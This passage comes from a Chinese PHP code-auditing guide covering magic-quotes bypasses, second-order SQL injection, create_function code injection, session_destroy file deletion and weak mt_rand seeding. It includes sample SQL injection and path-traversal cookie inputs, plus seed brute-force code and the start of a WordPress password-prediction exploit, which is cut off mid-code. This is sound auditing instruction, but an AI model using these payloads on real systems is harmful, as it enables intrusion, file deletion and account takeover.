+<td style="text-align:left">审计策略：查找对应的编码函数</td>
+</tr>
+</tbody>
+</table>
+<h3 id="二次攻击"><a href="#二次攻击" class="headerlink" title="二次攻击"></a>二次攻击</h3><p><em>详细见附录 [1]</em></p>
+<p><em>1) 数据库出来的变量没有进行过滤</em></p>
+<p><em>2) 数据库的转义符号：</em></p>
+<ul>
+<li>mysql/oracle转义符号同样是\（我们提交’通过魔术引号变化为\’，当我们update进入数据库时，通过转义变为’）</li>
+<li>mssql的转义字符为’（所以我们提交’通过魔术引号变化为\’，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义）</li>
+</ul>
+<p>从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：通读代码</td>
+</tr>
+</tbody>
+</table>
+<h3 id="魔术引号带来的新的安全问题"><a href="#魔术引号带来的新的安全问题" class="headerlink" title="魔术引号带来的新的安全问题"></a>魔术引号带来的新的安全问题</h3><p>首先我们看下魔术引号的处理机制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[\--&gt;\\,&apos;--&gt;\&apos;,&quot;--&gt;\&quot;,null--&gt;\0]</div></pre></td></tr></table></figure>
+<p>这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：</p>
+<p><em>1)得到原字符（’,\,”,null]）</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">//提交                 '</span></div><div class="line"><span class="comment">//魔术引号处理         \'</span></div><div class="line"><span class="comment">//substr               '</span></div><div class="line"></div><div class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</div><div class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</div><div class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</div><div class="line">   <span class="string">" WHERE order_sn = '$order_sn' LIMIT 1"</span>;</div></pre></td></tr></table></figure>
+<p><em>2)得到“\”字符</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">0</span>,<span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">//提交                 '</span></div><div class="line"><span class="comment">//魔术引号处理         \'</span></div><div class="line"><span class="comment">//substr               \    </span></div><div class="line"></div><div class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</div><div class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</div><div class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</div><div class="line">   <span class="string">" WHERE order_sn = '$order_sn' and order_tn='"</span>.$_GET[<span class="string">'order_tn'</span>].<span class="string">"'"</span>;</div></pre></td></tr></table></figure>
+<p>提交内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?order_sn=&apos;&amp;order_tn=%20and%201=1/*</div></pre></td></tr></table></figure>
+<p>执行的SQL语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> order_id, order_status, shipping_status, pay_status, shipping_time, </div><div class="line">shipping_id, invoice_no, user_id <span class="keyword">FROM</span> order_info <span class="keyword">WHERE</span> order_sn = <span class="string">'\' and </span></div><div class="line">order_tn=' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">/*'</span></div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找字符串处理函数如substr或者通读代码</td>
+</tr>
+</tbody>
+</table>
+<h3 id="变量key与魔术引号"><a href="#变量key与魔术引号" class="headerlink" title="变量key与魔术引号"></a>变量key与魔术引号</h3><p>我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></div><div class="line"><span class="comment">//print_R($_GET); </span></div><div class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">print</span> $key.<span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><em>1)当magic_quotes_gpc = On时，在php5.24下测试显示：</em></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">aaaa\'aaa</div><div class="line">bb\'b</div></pre></td></tr></table></figure>
+<p>从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa[bb']=1 </span></div><div class="line">print_R($_GET); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>结果显示:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Array</span> ( [aaaa<span class="string">'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) )</span></div></pre></td></tr></table></figure>
+<p>数组第一维变量的key不受魔术引号的影响。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：php4和php&lt;5.2.1</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：通读代码</td>
+</tr>
+</tbody>
+</table>
+<p><em>2)当magic_quotes_gpc = Off时，在php5.24下测试显示：</em></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">aaaa'aaa</div><div class="line">bb'b</div></pre></td></tr></table></figure>
+<p>对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//keyvul.php?aaa'aa=1'</span></div><div class="line"><span class="comment">//magic_quotes_gpc = Off</span></div><div class="line"> <span class="keyword">if</span> (!get_magic_quotes_gpc())</div><div class="line">&#123;</div><div class="line"> $_GET  = addslashes_array($_GET);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_array</span><span class="params">($value)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_array'</span>, $value) : addslashes($value);</div><div class="line">&#125;</div><div class="line">print_R($_GET);</div><div class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">print</span> $key;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Array</div><div class="line">(</div><div class="line">    [aaa'aa] =&gt; 1\'</div><div class="line">)</div><div class="line">aaa'aa</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：通读代码</td>
+</tr>
+</tbody>
+</table>
+<h3 id="代码注射"><a href="#代码注射" class="headerlink" title="代码注射"></a>代码注射</h3><hr>
+<h3 id="PHP中可能导致代码注射的函数"><a href="#PHP中可能导致代码注射的函数" class="headerlink" title="PHP中可能导致代码注射的函数"></a>PHP中可能导致代码注射的函数</h3><p>很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">assert()</td>
+</tr>
+<tr>
+<td style="text-align:left">call_user_func()</td>
+</tr>
+<tr>
+<td style="text-align:left">call_user_func_array()</td>
+</tr>
+<tr>
+<td style="text-align:left">create_function()</td>
+</tr>
+<tr>
+<td style="text-align:left">变量函数</td>
+</tr>
+</tbody>
+</table>
+<p>这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//how to exp this code</div><div class="line">$sort_by=$_GET['sort_by'];</div><div class="line">$sorter='strnatcasecmp';</div><div class="line">$databases=array('test','test');</div><div class="line">$sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);</div><div class="line">	      ';</div><div class="line">usort($databases, create_function('$a, $b', $sort_function));</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="变量函数与双引号"><a href="#变量函数与双引号" class="headerlink" title="变量函数与双引号"></a>变量函数与双引号</h3><p>对于单引号和双引号的区别，很多程序员深有体会，示例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> <span class="string">"$a\n"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'$a\n'</span>;</div></pre></td></tr></table></figure>
+<p>我们再看如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//how to exp this code</span></div><div class="line"><span class="keyword">if</span>($globals[<span class="string">'bbc_email'</span>])&#123;</div><div class="line"></div><div class="line">$text = preg_replace(</div><div class="line">		<span class="keyword">array</span>(<span class="string">"/\[email=(.*?)\](.*?)\[\/email\]/ies"</span>,</div><div class="line">				<span class="string">"/\[email\](.*?)\[\/email\]/ies"</span>),</div><div class="line">		<span class="keyword">array</span>(<span class="string">'check_email("$1", "$2")'</span>,</div><div class="line">				<span class="string">'check_email("$1", "$1")'</span>), $text);</div></pre></td></tr></table></figure>
+<p>另外很多的应用程序都把变量用””存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：通读代码</td>
+</tr>
+</tbody>
+</table>
+<h3 id="PHP自身函数漏洞及缺陷"><a href="#PHP自身函数漏洞及缺陷" class="headerlink" title="PHP自身函数漏洞及缺陷"></a>PHP自身函数漏洞及缺陷</h3><hr>
+<h3 id="PHP函数的溢出漏洞"><a href="#PHP函数的溢出漏洞" class="headerlink" title="PHP函数的溢出漏洞"></a>PHP函数的溢出漏洞</h3><p>大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录 [2]）项目么，其中比较有名的要算是unserialize()，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . <span class="string">'_data'</span>]);</div></pre></td></tr></table></figure>
+<p>在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：对应fix的版本</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找对应函数名</td>
+</tr>
+</tbody>
+</table>
+<h3 id="PHP函数的其他漏洞"><a href="#PHP函数的其他漏洞" class="headerlink" title="PHP函数的其他漏洞"></a>PHP函数的其他漏洞</h3><p>Stefan Esser大牛发现的漏洞：unset()–Zend_Hash_Del_Key_Or_Index Vulnerability<br>​<br>比如phpwind早期的serarch.php里的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unset</span>($uids);</div><div class="line">......</div><div class="line">$query=$db-&gt;query(<span class="string">"SELECT uid FROM pw_members WHERE username LIKE '$pwuser'"</span>);</div><div class="line"><span class="keyword">while</span>($member=$db-&gt;fetch_array($query))&#123;</div><div class="line">	$uids .= $member[<span class="string">'uid'</span>].<span class="string">','</span>;</div><div class="line">&#125;</div><div class="line">$uids ? $uids=substr($uids,<span class="number">0</span>,<span class="number">-1</span>) : $sqlwhere.=<span class="string">' AND 0 '</span>;</div><div class="line">........</div><div class="line">$query = $db-&gt;query(<span class="string">"SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"</span>);</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：php4&lt;4.3 php5&lt;5.14</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找unset</td>
+</tr>
+</tbody>
+</table>
+<h3 id="session-destroy-删除文件漏洞"><a href="#session-destroy-删除文件漏洞" class="headerlink" title="session_destroy()删除文件漏洞"></a>session_destroy()删除文件漏洞</h3><p><em>测试PHP版本：5.1.2</em><br>​<br>这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//val.php   </span></div><div class="line">session_save_path(<span class="string">'./'</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'del'</span>]) &#123;</div><div class="line">	session_unset();</div><div class="line">	session_destroy();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	$_SESSION[<span class="string">'hei'</span>]=<span class="number">1</span>;</div><div class="line">	<span class="keyword">echo</span>(session_id());</div><div class="line">	print_r($_SESSION);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink(‘sess<code>_</code>/../1.php’)这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：具体不详</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找session_destroy</td>
+</tr>
+</tbody>
+</table>
+<h3 id="随机函数"><a href="#随机函数" class="headerlink" title="随机函数"></a>随机函数</h3><p><em>1) rand() VS mt_rand()</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//on windows</span></div><div class="line"><span class="keyword">print</span> mt_getrandmax(); <span class="comment">//2147483647</span></div><div class="line"><span class="keyword">print</span> getrandmax();<span class="comment">// 32767</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a= md5(rand());</div><div class="line">for($i=0;$i&lt;=32767;$i++)&#123;</div><div class="line">  if(md5($i) ==$a ) &#123;</div><div class="line">   print $i."--&gt;ok!! |</div><div class="line">| ";exit;</div><div class="line">   &#125;else &#123; print $i." |</div><div class="line">| ";&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找rand</td>
+</tr>
+</tbody>
+</table>
+<p><em>2) mt_srand()/srand()-weak seeding（by Stefan Esser）</em></p>
+<p>看php手册里的描述：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mt_srand</div><div class="line">(PHP <span class="number">3</span> &gt;= <span class="number">3.0</span><span class="number">.6</span>, PHP <span class="number">4</span>, PHP <span class="number">5</span>)</div><div class="line"></div><div class="line">mt_srand -- 播下一个更好的随机数发生器种子</div><div class="line">说明</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">mt_srand</span> <span class="params">( <span class="keyword">int</span> seed )</span></span></div></pre></td></tr></table></figure>
+<p>用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。 </p>
+<p>例子 1. mt_srand() 范例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// seed with microseconds</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_seed</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">list</span>($usec, $sec) = explode(<span class="string">' '</span>, microtime());</div><div class="line">    <span class="keyword">return</span> (float) $sec + ((float) $usec * <span class="number">100000</span>);</div><div class="line">&#125;</div><div class="line">mt_srand(make_seed());</div><div class="line">$randval = mt_rand();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>_注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt<em>srand() 函数给随机数发生器播种，现已自动完成。</em></p>
+<p>php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mt_srand ((<span class="keyword">double</span>) microtime() * <span class="number">1000000</span>)</div></pre></td></tr></table></figure>
+<p>但是使用(double)microtime()<code>*</code>1000000类似的代码seed是比较脆弱的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()&lt;<span class="number">1</span> ---&gt; <span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()* <span class="number">1000000</span>&lt;<span class="number">1000000</span></div></pre></td></tr></table></figure>
+<p>那么很容易暴力破解,测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/////////////////</span></div><div class="line"><span class="comment">//&gt;php rand.php</span></div><div class="line"><span class="comment">//828682</span></div><div class="line"><span class="comment">//828682</span></div><div class="line"><span class="comment">////////////////</span></div><div class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="number">0</span>);</div><div class="line">$time=(double) microtime()* <span class="number">1000000</span>;</div><div class="line"><span class="keyword">print</span> $time.<span class="string">"\n"</span>;</div><div class="line">mt_srand ($time);</div><div class="line"></div><div class="line">$search_id = mt_rand();</div><div class="line">$seed = search_seed($search_id);</div><div class="line"><span class="keyword">print</span> $seed;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">search_seed</span><span class="params">($rand_num)</span> </span>&#123;</div><div class="line">$max = <span class="number">1000000</span>;</div><div class="line"><span class="keyword">for</span>($seed=<span class="number">0</span>;$seed&lt;=$max;$seed++)&#123;</div><div class="line">	mt_srand($seed);</div><div class="line">	$key = mt_rand();</div><div class="line">	<span class="keyword">if</span>($key==$rand_num) <span class="keyword">return</span> $seed;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">例A</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><em>seed-A</em></td>
+</tr>
+<tr>
+<td style="text-align:left">mt_rand-A-1</td>
+</tr>
+<tr>
+<td style="text-align:left">mt_rand-A-2</td>
+</tr>
+<tr>
+<td style="text-align:left">mt_rand-A-3</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">例B</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><em>seed-B</em></td>
+</tr>
+<tr>
+<td style="text-align:left">mt_rand-B-1</td>
+</tr>
+<tr>
+<td style="text-align:left">mt_rand-B-2</td>
+</tr>
+<tr>
+<td style="text-align:left">mt_rand-B-3</td>
+</tr>
+</tbody>
+</table>
+<p>对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。</p>
+<p>对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：</p>
+<p>第一种：’Cross Application Attacks’，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()<code>*</code> 1000000)），phpbb+wordpree组合就存在这样的危险.</p>
+<p>第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：<br>The Implementation</p>
+<blockquote>
+<p>When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.</p>
+</blockquote>
+<p>在32位系统上默认的播种的种子为最大值是<code>2^32</code>，这样我们循环最多<code>2^32</code>次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录 [3] ）,测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">4</span>); </div><div class="line">$a = mt_rand(); </div><div class="line">mt_srand(<span class="number">5</span>); </div><div class="line">$b = mt_rand();</div><div class="line"><span class="keyword">print</span> $a.<span class="string">"\n"</span>.$b;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//base on http://www.milw0rm.com/exploits/6421 </span></div><div class="line"><span class="comment">//test on php 5.2.0</span></div><div class="line"></div><div class="line">define(<span class="string">'BUGGY'</span>, <span class="number">1</span>); <span class="comment">//上面代码$a==$b时候定义BUGGY=1</span></div><div class="line"></div><div class="line">$key = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</div><div class="line"><span class="keyword">echo</span> $key.<span class="string">"\n"</span>;</div><div class="line">$seed = getseed($key);</div><div class="line"><span class="keyword">print</span> $seed.<span class="string">"\n"</span>; </div><div class="line"></div><div class="line">mt_srand($seed);</div><div class="line">$pass = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</div><div class="line"><span class="keyword">echo</span> $pass.<span 